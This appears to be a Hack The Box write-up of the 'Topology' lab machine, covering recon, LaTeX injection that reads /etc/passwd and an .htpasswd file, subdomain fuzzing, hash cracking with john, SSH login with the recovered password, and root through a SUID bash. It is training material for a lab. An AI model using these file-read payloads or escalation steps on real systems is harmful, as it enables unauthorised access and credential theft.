# Topology-HTB
Hello Guy's

Finding open ports:
1)22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)

2)80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))

When i open in browser showing normal topology website.

Directory fuzzing:
Finding lots of directory but all are useless.

In main page showing latex equation generator page but this is not open.
{Add /etc/hosts file in ip and -  latex.topology.htb}

Showing a search field where you put any math formula and website throw some results.
**(Latex injection, also known as code injection, is a security vulnerability that occurs when an attacker is able to inject malicious LaTeX code into an application or system that processes LaTeX input)**

now try to find payload related to latex injection.(https://0day.work/hacking-with-latex/)

try this "$\lstinputlisting{/etc/passwd}$\" , but showing error message

again try "$\lstinputlisting{/etc/passwd}$" and get /etc/passwd file where i show a user.

Now try to find subdomains in topology.htb.

Use ffuf tool:

ffuf -u http://topology.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.toplogy.htb" -fc 200

And get "dev"

Now add /etc/hosts in dev.topology.htb file in your ip.

When I open this url showing login page, when i try to use admin:admin as a credentials but website throw (401:unauthorized) status error.

Now find apache 401 unauthorized exploit:

Now i find /var/www/dev/.htpasswd file reterived credentials which is encrypted form.

Now try this payload:

"$\lstinputlisting{/var/www/dev/.htpasswd}$"

Get credentials: 

vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTYO

Crack this hash using john:
$john hash.txt --wordlist=/home/kali/rockyou.txt ==> calculus20

Using ssh get the shell of the machine using
(vdaisley:calculus20) this credentials.

Got user.txt

Now to find root priv, linpeas.sh file is already contains in home directory.

But I use manually check sudo binary using find command:
$find / -perm -4000 -type f 2>/dev/null

I found /usr/bin/bash binary:
when i check 
$ls -ld /usr/bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /usr/bin/bash

**$/usr/bin/bash -p**

and :)Boom:) get root.

find root.txt and finally go to bed:)
